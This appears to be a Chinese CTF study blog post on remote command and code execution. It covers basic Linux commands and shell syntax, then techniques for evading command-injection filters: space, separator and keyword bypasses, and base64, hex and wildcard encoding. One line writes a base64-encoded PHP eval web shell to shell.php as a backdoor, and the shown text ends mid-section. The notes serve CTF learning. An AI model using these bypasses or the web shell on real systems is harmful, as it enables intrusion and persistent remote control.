<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"بحث...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="前言RCE英文全称：remote command&#x2F;code execute分为远程命令执行system和远程代码执行evel。">
<meta property="og:type" content="article">
<meta property="og:title" content="rce">
<meta property="og:url" content="http://example.com/2022/07/15/rce/index.html">
<meta property="og:site_name" content="mayylu">
<meta property="og:description" content="前言RCE英文全称：remote command&#x2F;code execute分为远程命令执行system和远程代码执行evel。">
<meta property="og:locale">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715162727.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715211205.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/l4sij.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/se6sc.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715223832.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220802184221.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112652.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112630.jpg">
<meta property="article:published_time" content="2022-07-15T13:04:19.000Z">
<meta property="article:modified_time" content="2022-10-04T10:12:18.480Z">
<meta property="article:author" content="mayylu">
<meta property="article:tag" content="rce">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715162727.png">


<link rel="canonical" href="http://example.com/2022/07/15/rce/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-Hans","comments":true,"permalink":"http://example.com/2022/07/15/rce/","path":"2022/07/15/rce/","title":"rce"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>rce | mayylu</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="تشغيل شريط التصفح" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">mayylu</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          المحتويات
        </li>
        <li class="sidebar-nav-overview">
          عام
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rce%E2%80%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">rce–命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">常见命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%AC%A6%E5%8F%B7"><span class="nav-number">2.2.</span> <span class="nav-text">常见符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.</span> <span class="nav-text">命令执行中的各种绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="nav-number">2.3.1.</span> <span class="nav-text">绕过空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E9%9A%94%E7%AC%A6"><span class="nav-number">2.3.2.</span> <span class="nav-text">绕过分隔符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">2.3.3.</span> <span class="nav-text">绕过关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">2.3.4.</span> <span class="nav-text">绕过长度限制</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-number">2.4.</span> <span class="nav-text">php命令执行函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="nav-number">2.5.</span> <span class="nav-text">php命令执行绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rce%E2%80%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">rce–代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">代码执行函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="nav-number">3.2.</span> <span class="nav-text">php代码执行漏洞绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.</span> <span class="nav-text">php文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.1.</span> <span class="nav-text">目录操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">3.3.2.</span> <span class="nav-text">文件操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">3.3.3.</span> <span class="nav-text">文件写入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">3.3.4.</span> <span class="nav-text">文件读取</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%87%BA"><span class="nav-number">3.4.</span> <span class="nav-text">输出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="nav-number">3.5.</span> <span class="nav-text">无参数rce</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="nav-number">3.5.1.</span> <span class="nav-text">核心代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8E%E5%A4%96%E5%8F%96%E5%80%BC"><span class="nav-number">3.5.2.</span> <span class="nav-text">从外取值</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-getallheaders"><span class="nav-number">3.5.2.1.</span> <span class="nav-text">1.getallheaders()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-get-defined-vars-%E7%89%88%E6%9C%AC%E8%A6%81%E6%B1%82%EF%BC%9APHP-4-gt-4-0-4-PHP-5-PHP-7"><span class="nav-number">3.5.2.2.</span> <span class="nav-text">2.get_defined_vars()(版本要求：PHP 4 &gt;&#x3D; 4.0.4, PHP 5, PHP 7)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-session-id"><span class="nav-number">3.5.2.3.</span> <span class="nav-text">3.session_id()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-getenv"><span class="nav-number">3.5.2.4.</span> <span class="nav-text">4.getenv()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">3.5.3.</span> <span class="nav-text">直接读取文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%93%8D%E4%BD%9C"><span class="nav-number">3.5.3.1.</span> <span class="nav-text">路径操作</span></a></li></ol></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">mayylu</p>
  <div class="site-description" itemprop="description">关注生活的点点滴滴</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">المقالات</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">الوسوم</span>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/15/rce/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mayylu">
      <meta itemprop="description" content="关注生活的点点滴滴">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mayylu">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          rce
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">نُشر في</span>

      <time title="أُنشأ: 2022-07-15 21:04:19" itemprop="dateCreated datePublished" datetime="2022-07-15T21:04:19+08:00">2022-07-15</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">عُدل في</span>
        <time title="عُدل: 2022-10-04 18:12:18" itemprop="dateModified" datetime="2022-10-04T18:12:18+08:00">2022-10-04</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>RCE英文全称：remote command/code execute<br>分为远程命令执行system和远程代码执行evel。</p>
<span id="more"></span>

<h2 id="rce–命令执行"><a href="#rce–命令执行" class="headerlink" title="rce–命令执行"></a>rce–命令执行</h2><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ol>
<li>cd命令(change directory)<br>~ 也表示为当前用户的家目录，. 则是表示目前所在的目录， .. 则表示目前目录位置的上一层目录。<br> cd        进入用户主目录<br> cd -      返回进入此目录之前所在目录<br> cd ..     返回上一级目录<br> cd ../..  返回上两级目录<br> cd !$    把上个命令的参数作为cd 参数使用<br> cd .      当前目录</li>
<li>ls命令(list)<br>ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls 文件名，若文件存在，输出文件名</span><br><span class="line">ls -a     列出目录所有文件，包含以.开始的隐藏文件</span><br><span class="line">ls -r     反序排列</span><br><span class="line">ls -R     递归处理，将指定目录下的所有文件及子目录一并处理；</span><br><span class="line">ls -t     以文件修改时间排序</span><br><span class="line">ls -S     以文件大小排序</span><br><span class="line"></span><br><span class="line">ls -l(ll) 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来</span><br><span class="line">  7  rw  5  r  3  w  x    </span><br><span class="line">-rwx    rx    rx.           1          root  root      0       Sep 29 19:36          as </span><br><span class="line">u所有者,g组群,o其他人的权限 一级目录个数 所有者 所属的组 文件的大小 最近修改文件的最后日期 文件名</span><br><span class="line">----------a--------------</span><br></pre></td></tr></table></figure>
<img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715162727.png" alt="QQ截图20220715162727"></li>
</ol>
<p>蓝色表示目录; 绿色表示可执行文件; 红色表示压缩文件; 浅蓝色表示链接文件; 灰色表示其它文件; 红色闪烁表示链接的文件有问题了; 黄色是设备文件<br>3. dir命令(和 ls 命令类似)只不过用ls写入文件中时，每个文件名都是单独一行，它会自动换行，但dir就会全部写入一行中，并且会自动加空格<br>4. pwd 命令(print work directory)<br>用于查看当前工作目录路径,查看软链接的实际路径<code>pwd -P</code><br>5. mkdir命令(make directory) 用于创建文件夹<br>6. rm 命令(remove)<br>可以直接使用 rm 命令删除文件；<br>-r ：是 rm 命令的可选项，表示递归处理，将指定目录下的所有文件与子目录一并处理；<br>-f ：是 rm 命令的可选项，表示强制删除文件或目录<br>7. mv 命令(move)<br>移动文件或修改文件名，根据第二参数类型（如目录，则移动文件；<br>如文件,则以此文件名重命名文件,并覆盖同名的原文件）<br>移动目录或修改目录，根据第二参数是否存在（目录名已存在，将移动目录到目录 中；<br>目录名不存在,则重命名目录并移动到目录所在位置使目录存在.)<br>8. cp 命令(copy)<br> -f：覆盖已经存在的目标文件而不给出提示。<br> -p：除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。<br> -r或-R：递归处理，将指定目录下的子文件和子目录一并处理（复制目录的时候使用）<br>9. cat 命令(concatenate)<br>用于连接文件并打印到标准输出设备上<br>10. tac<br>Linux常用命令tac 刚好是将 cat 反写过来,所以他的功能就跟 cat 相反啦,<br>即tac 则是“ 由最后一行到第一行反向在屏幕上显示出来,行内的顺序不变<br>11. more 命令<br>cat的升级版, more 会以一页一页的显示方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示。<br>（1）显示文件中从第3行起的内容<br>more +3 text.txt<br>（2）在所列出文件目录详细信息，借助管道使每次显示 5 行<br>ls -l | more -5<br>12. less<br>less 与 more 类似，less 可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。<br>13. head<br>head 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。<br>    -q 隐藏文件名<br>    -v 显示文件名<br>    -c&lt;数目&gt; 显示的字节数。<br>    -n&lt;行数&gt; 显示的行数。<br>14. tail<br>tail 命令可用于查看文件的结尾部分的内容,tail -f filename ,会跟踪名为 filename的增长情况,会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。<br>15. nl<br>nl可以将输出的文件内容前自动的加上行号,整体来说，nl主要是对行号做更多的修饰。<br>16.  rev命令<br>把每一行字符的顺序颠倒过来显示文件内容<br>若其后跟的是文件,则将文件每一行颠倒,但行的顺序不变</p>
<ol start="17">
<li>sh命令<br>将文件中的内容当作命令来执行</li>
<li>find命令<br>用来在指定目录下查找文件<br>实例：<br>将当前目录及其子目录下所有文件后缀为 .c 的文件列出来:<br><code># find . -name &quot;*.c&quot;</code><br>寻找根目录下所以flag开头的文件<br><code>find / -name flag*</code></li>
<li>ln命令<br>在链接目标目录中修改文件都会在源文件目录中同步变化。<br>软连接：ln –s 源文件 链接文件<br>是在选定的地方生成一个文件的映射，映射文件不占用磁盘空间，软链接可以 跨文件系统 ，硬链接不可以<br>修改存在的软连接： ln -nsf 源文件 链接文件</li>
</ol>
<p>硬链接：ln 源文件 链接文件<br>是在选定的位置生成一个文件的镜像，镜像文件与源文件同样大小，但不占用实际空间，不允许给目录创建硬链接。<br>删除链接：unlink 链接文件</p>
<h3 id="常见符号"><a href="#常见符号" class="headerlink" title="常见符号"></a>常见符号</h3><ul>
<li><p>\ 转义字符<br>放在特殊符号前，则该特殊符号的作用消失，放在指令的最末端，表示指令连接下一行</p>
</li>
<li><p>&lt;输出重定向</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">命令符号格式 	            作用</span><br><span class="line">命令 &lt; 文件 	        将指定文件作为命令的输入设备</span><br><span class="line">命令 &lt;&lt; 分界符 	        表示从标准输入设备（键盘）中读入，直到遇到分界符才停止（读入的数据不包括分界符），这里的分界符其实就是自定义的字符串</span><br><span class="line">命令 &lt; 文件 1 &gt; 文件 2 	将文件 1 作为命令的输入设备，该命令的执行结果输出到文件 2 中。</span><br></pre></td></tr></table></figure></li>
<li><blockquote>
<p>表示覆盖内容</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1, 通过&gt;来创建文件</span><br><span class="line"></span><br><span class="line">&gt;flag.txt</span><br><span class="line"></span><br><span class="line">2，通过&gt;将命令结果存入文件中</span><br><span class="line"></span><br><span class="line">echo &quot;hello hacker&quot; &gt; flag.txt</span><br><span class="line"></span><br><span class="line">3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</span><br><span class="line"></span><br><span class="line">echo &quot;hello hacker&quot; &gt;&gt; flag.txt</span><br></pre></td></tr></table></figure></li>
<li><p>‘’，””<br>单引号’’剥夺了所有字符的特殊含义，单引号’’内就变成了单纯的字符。<br>双引号””则对于双引号””内的参数替换($)和命令替换(``)是个例外。</p>
</li>
<li><p>{}<br>花括号拓展<br>如touch {a,b}.txt 结果为a.txt b.txt。<br>如：touch {a…d}.txt 结果为a.txt b.txt c.txt d.txt。</p>
</li>
<li><p>Linux中$ {}、$()、$(())的功能</p>
</li>
</ul>
<p>$ {}：对变量的替换，同$var。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@cn21 ~]# var=login</span><br><span class="line">[root@cn21 ~]# echo &quot;aa$var&quot;</span><br><span class="line">aalogin</span><br><span class="line">[root@cn21 ~]# echo &quot;$varaa&quot;</span><br><span class="line"></span><br><span class="line">[root@cn21 ~]# echo &quot;$var aa&quot;</span><br><span class="line">login aa</span><br><span class="line">[root@cn21 ~]# echo &quot;$&#123;var&#125;aa&quot; #注意此时大括号作用</span><br><span class="line">loginaa</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$()：对命令的替换，同``（反引号）。</p>
<p>$(()):对内部内容进行整数运算$((var1*var2))。或将其他进制转换为十进制$((N#var))，其中N为进制。</p>
<h3 id="命令执行中的各种绕过"><a href="#命令执行中的各种绕过" class="headerlink" title="命令执行中的各种绕过"></a>命令执行中的各种绕过</h3><p>在ctf中，命令执行一直是一个非常重要的考点，一道ctf题最后往往都需要我们执行命令来拿到flag，但一般都会有各种各样的过滤限制，接下来就来总结一下如何绕过这些过滤</p>
<h4 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;      --   重定向，如cat&lt;&gt;flag.php</span><br><span class="line">%09  --  需要php环境，如cat%09flag.php</span><br><span class="line">$&#123;IFS&#125;  --  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php</span><br><span class="line">$IFS$9  --  后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</span><br></pre></td></tr></table></figure>
<h4 id="绕过分隔符"><a href="#绕过分隔符" class="headerlink" title="绕过分隔符"></a>绕过分隔符</h4><p><strong>windows</strong>：</p>
<p>‘|’  在前面命令的结果上，执行后面的指令<br>‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>‘&amp;’  前面和后面命令都要执行，无论前面真假<br>&amp;&amp;   如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
<p><strong>Linux</strong>:<br>Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同</p>
<h4 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h4><ol>
<li>字符拆分绕过</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -&gt; l\s</span><br><span class="line">ls -&gt; l&quot;&quot;s</span><br><span class="line">ls -&gt; l``s</span><br><span class="line">cat /flag -&gt; ca\t /flag -&gt; c\a\t /flag</span><br><span class="line">cat /flag -&gt; ca&quot;&quot;t /flag -&gt; c&quot;&quot;a&quot;&quot;t /flag</span><br><span class="line">cat /flag -&gt; ca``t /flag -&gt; c``a``t /flag</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>拆分命令绕过</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -&gt; a=l;b=s;$a$b</span><br><span class="line">cat /flag -&gt; a=ag;b=fl;cat /$b$a;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>编码绕过</li>
</ol>
<p>1.base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cat&#x27; | base64  --&gt; Y2F0Cg==</span><br><span class="line">那我们就可以构造 cat /flag为：</span><br><span class="line">`echo Y2F0Cg== | base64 -d` /flag</span><br><span class="line"></span><br><span class="line">echo PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSkgPz4=|base64 -d&gt; shell.php</span><br><span class="line">注入后门,密码为cmd</span><br></pre></td></tr></table></figure>
<p>2.hex</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo 77686F616D69 | xxd -r -p | bash </span><br><span class="line">其中77686F616D69是whoami的hex编码</span><br><span class="line"></span><br><span class="line">echo 636174202f666c6167 | xxd -r -p|bash </span><br><span class="line">其中636174202f666c6167是cat /flag的hex编码</span><br></pre></td></tr></table></figure>

<p>3.通配符绕过(与正则类似)</p>
<p>在执行命令前，包含通配符的字符串将转换成匹配到的文件名，文件名按照字母顺序排列，以空格隔开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*	    匹配任意长度字符</span><br><span class="line">？	    匹配任意一个字符</span><br><span class="line">[abcd]	匹配abcd中的一个字符</span><br><span class="line">[a-z]	匹配a-z中任意一个字符</span><br><span class="line">[!abcd]	不匹配括号中的任意一个字符</span><br><span class="line">[^a-z]	不匹配a-z中任意一个字符</span><br></pre></td></tr></table></figure>
<p>linux下命令其实也是文件比如说像cat就对应文件/bin/cat，ls就对应文件/bin/ls等等，我们也可以用类似的方法进行构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls -&gt;  /bin/l?</span><br><span class="line">cat -&gt; /bin/c??</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">像preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)这种flag字样都是被过滤了的，我们用通配符就很好用：</span><br><span class="line">cat /flag -&gt; /bin/ca? /????</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><p>将命令写入文件并拼接，用sh执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 